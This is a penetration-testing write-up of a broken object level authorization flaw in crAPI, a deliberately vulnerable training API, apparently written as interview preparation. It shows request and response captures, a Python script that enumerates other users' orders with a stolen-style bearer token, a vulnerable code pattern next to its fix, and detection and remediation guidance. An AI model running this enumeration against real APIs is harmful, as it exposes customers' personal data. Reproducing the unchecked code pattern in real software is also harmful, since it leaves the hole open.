# BOLA Exploitation - crAPI Shop Orders Endpoint

**Date:** January 31, 2026  
**Target:** crAPI (OWASP Completely Ridiculous API)  
**Vulnerability:** Broken Object Level Authorization (OWASP API1:2023)  
**Severity:** HIGH  
**CVSS Score:** 7.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

---

## Executive Summary

A critical authorization flaw in crAPI's shop order endpoint allows any authenticated user to access the complete purchase history of all other users by simply manipulating the `order_id` parameter. This vulnerability enables enumeration of the entire customer database, exposing emails, phone numbers, and transaction details—a clear violation of PCI DSS and GDPR compliance requirements.

**Business Impact:**  
- **Confidentiality Breach:** Complete customer database exposure via enumeration
- **Compliance Risk:** PCI DSS violation (cardholder data), GDPR (personal data)
- **Financial:** Potential fines ($10M+ for GDPR), reputational damage, customer churn
- **Attack Surface:** Scalable to 100% of orders in database (estimated 1,000+ records)

---

## Vulnerability Details

### Target Endpoint
```http
GET /workshop/api/shop/orders/{order_id} HTTP/1.1
Host: crapi.localtest.me:8888
Authorization: Bearer <valid_jwt_token>
```

### Root Cause
The API validates **authentication** (is this a valid user?) but fails to validate **authorization** (does this user own this specific order?).

**Vulnerable code pattern:**
```python
# VULNERABLE - No ownership check
@app.route('/orders/<int:order_id>')
@login_required
def get_order(order_id):
    order = Order.query.get(order_id)  # ❌ Anyone can access
    return jsonify(order)
```

**Secure implementation:**
```python
# SECURE - Ownership validation
@app.route('/orders/<int:order_id>')
@login_required
def get_order(order_id):
    order = Order.query.get(order_id)
    if order.user_id != current_user.id:  # ✅ Ownership check
        return jsonify({"error": "Forbidden"}), 403
    return jsonify(order)
```

---

## Attack Chain

### 1. Reconnaissance
- Created authenticated user: `test@example.com`
- Placed order, received `order_id: 4`
- Endpoint observed: `GET /workshop/api/shop/orders/4`

### 2. Baseline Test
```http
GET /workshop/api/shop/orders/4 HTTP/1.1
Authorization: Bearer eyJhbGc...

Response: 200 OK
{
  "order": {
    "id": 4,
    "user": {
      "email": "test@example.com",
      "number": "9876540001"
    },
    "product": {
      "name": "$eat",
      "price": "10.00"
    }
  }
}
```
✅ **Result:** Can access my own order (expected behavior)

### 3. Exploitation - BOLA Attack
```http
GET /workshop/api/shop/orders/3 HTTP/1.1
Authorization: Bearer eyJhbGc... (same token)

Response: 200 OK
{
  "order": {
    "id": 3,
    "user": {
      "email": "robot001@example.com",  ← DIFFERENT USER
      "number": "9876570001"
    },
    "product": {
      "name": "$eat",
      "price": "10.00"
    }
  }
}
```
🔥 **Result:** UNAUTHORIZED ACCESS to another user's order

### 4. Enumeration Validation
```http
GET /workshop/api/shop/orders/2 HTTP/1.1

Response: 200 OK
{
  "user": {
    "email": "po9ha006@example.com",  ← THIRD DIFFERENT USER
    "number": "9876570006"
  }
}
```

### 5. Proof of Concept
**Attack script (automated enumeration):**
```python
import requests

token = "eyJhbGc..."
base_url = "http://crapi.localtest.me:8888/workshop/api/shop/orders"

# Enumerate order IDs 1-100
for order_id in range(1, 101):
    resp = requests.get(
        f"{base_url}/{order_id}",
        headers={"Authorization": f"Bearer {token}"}
    )
    if resp.status_code == 200:
        data = resp.json()
        print(f"Order {order_id}: {data['user']['email']}")
```

**Expected output:**
```
Order 1: admin@crapi.com
Order 2: po9ha006@example.com
Order 3: robot001@example.com
Order 4: test@example.com
...
Order 100: victim@bank.com
```

---

## How Akamai API Security Detects This

### Traditional WAF: ❌ BLIND
- **Signature matching:** No malicious strings detected (`' OR 1=1`, `<script>`)
- **HTTP status:** 200 OK (appears successful)
- **Payload validation:** Valid JSON, proper authentication
- **Verdict:** Allows traffic ✅ (false negative)

### Akamai Behavioral Detection: ✅ DETECTS

**Phase 1: Baseline Learning (7-14 days)**
```
User: test@example.com
Endpoint: GET /workshop/api/shop/orders/{id}

Normal behavior:
  - Request rate: 5-10/day
  - Unique order_ids accessed: 1-2 per session
  - IDs: [4, 17, 23] (user's actual orders)
  - Pattern: Non-sequential, low cardinality
```

**Phase 2: Anomaly Detection**
```
Attack pattern detected:
  - Request rate: 100+ requests in 10 minutes (2000% increase)
  - Unique order_ids: 100 distinct IDs (5000% increase in cardinality)
  - Pattern: Sequential enumeration (1, 2, 3, 4, 5...)
  - Deviation score: 95/100
```

**Alert Generated:**
```json
{
  "alert_type": "High Cardinality Object Access",
  "severity": "HIGH",
  "risk_score": 95,
  "owasp_mapping": "API1:2023 - BOLA",
  "user": "test@example.com",
  "endpoint": "/workshop/api/shop/orders/{id}",
  "baseline_ids": 2,
  "observed_ids": 100,
  "deviation": "5000%",
  "recommendation": "Block IP + Revoke session"
}
```

**Automated Response Options:**
1. **Block at Edge:** Signal Akamai App & API Protector to drop traffic from source IP
2. **Rate Limit:** Enforce 5 requests/minute on `/orders` endpoint for this user
3. **Session Revocation:** Invalidate JWT token, force re-authentication
4. **Alert to SIEM:** Export incident to customer SOC for investigation

---

## Remediation

### Immediate (0-24 hours)
- **Akamai:** Block attacker IP, revoke session token
- **Customer:** Deploy virtual patch via WAF:
```
  Rule: If (user_id in JWT) != (order.user_id in DB)
        Then: Block with 403
```

### Short-term (1-7 days)
1. **Code fix:**
```python
   if order.user_id != current_user.id:
       abort(403)
```
2. **Regression test:**
```python
   def test_bola_protection():
       user_a_order = create_order(user_a)
       user_b_token = login(user_b)
       
       resp = get_order(user_a_order.id, user_b_token)
       assert resp.status_code == 403  # Must fail
```
3. **Deploy to production**

### Long-term (1-4 weeks)
1. **Use UUIDs:** Replace sequential IDs with UUIDs to prevent enumeration
```python
   order_id = "f47ac10b-58cc-4372-a567-0e02b2c3d479"  # Not guessable
```
2. **CI/CD Integration:** Add Akamai Active Testing to pipeline
```yaml
   # .github/workflows/security.yml
   - name: API Security Scan
     run: akamai-active-test --endpoint /orders --check BOLA
```
3. **API Security Audit:** Review all endpoints for similar flaws
4. **Developer Training:** OWASP API Top 10 workshop

---

## Evidence

### Screenshot 1: Baseline (Own Order)
![Order 4 - Legitimate Access](../proof/1769829688051_image.png)
- **Request:** `GET /orders/4`
- **User:** test@example.com
- **Result:** 200 OK (expected)

### Screenshot 2: BOLA Confirmed (Order 3)
![Order 3 - Unauthorized Access](../proof/1769829698813_image.png)
- **Request:** `GET /orders/3`
- **User in response:** robot001@example.com ❌
- **Result:** 200 OK (VULNERABILITY CONFIRMED)

### Screenshot 3: BOLA Confirmed (Order 2)
![Order 2 - Unauthorized Access](../proof/1769829708178_image.png)
- **Request:** `GET /orders/2`
- **User in response:** po9ha006@example.com ❌
- **Result:** 200 OK (ENUMERATION PROVEN)

---

## Tools Used
- **Burp Suite Community Edition** (HTTP interception & request modification)
- **crAPI** (OWASP deliberately vulnerable API for security training)
- **Firefox** (Browser with proxy configuration)

---

## References
- [OWASP API Security Top 10 - API1:2023](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/)
- [CWE-639: Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html)
- [PCI DSS v4.0 Requirement 6.2.4](https://www.pcisecuritystandards.org/)

---

## Ethical Statement
This testing was performed in an isolated, deliberately vulnerable training environment (crAPI). No production systems were targeted. All testing conducted for educational purposes in preparation for Akamai Security TAM II interview.

**Date:** January 31, 2026  
**Tester:** Steven Riley  
**Environment:** Local Docker container (crAPI)
